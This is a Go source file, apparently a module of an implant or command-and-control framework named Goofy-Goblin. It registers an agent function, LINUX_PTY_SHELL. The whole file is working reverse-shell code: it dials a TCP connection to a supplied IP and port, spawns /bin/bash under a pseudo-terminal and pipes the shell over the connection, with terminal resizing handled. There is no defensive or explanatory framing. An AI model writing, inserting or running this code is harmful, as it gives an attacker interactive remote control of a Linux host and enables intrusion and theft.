// +build linux_pty_shell

package main

import (
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/johnathanclong/Goofy-Goblin/pkg/core"

	"github.com/johnathanclong/Goofy-Goblin/pkg/agent"
	"github.com/kr/pty"
)

func init() {
	_init(core.Function{
		Code:   "LINUX_PTY_SHELL",
		Period: 0,
		Mode:   core.CoreCall,
		Active: true,
		Func:   ConnectBack,
	})
}

// ConnectBack Send a PTY TCP reverse shell back
func ConnectBack(a agent.Agent, parameters []string) {
	var ip = parameters[0]
	var port = parameters[1]

	// Create arbitrary command.
	c := exec.Command("/bin/bash")

	// Create TCP connection
	conn, _ := net.Dial("tcp", ip+":"+port)

	// Start the command with a pty.
	ptmx, err := pty.Start(c)
	if err != nil {
		return
	}
	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.

	// Copy stdin to the pty and the pty to stdout.
	go func() { _, _ = io.Copy(ptmx, conn) }()
	_, _ = io.Copy(conn, ptmx)

	return
}
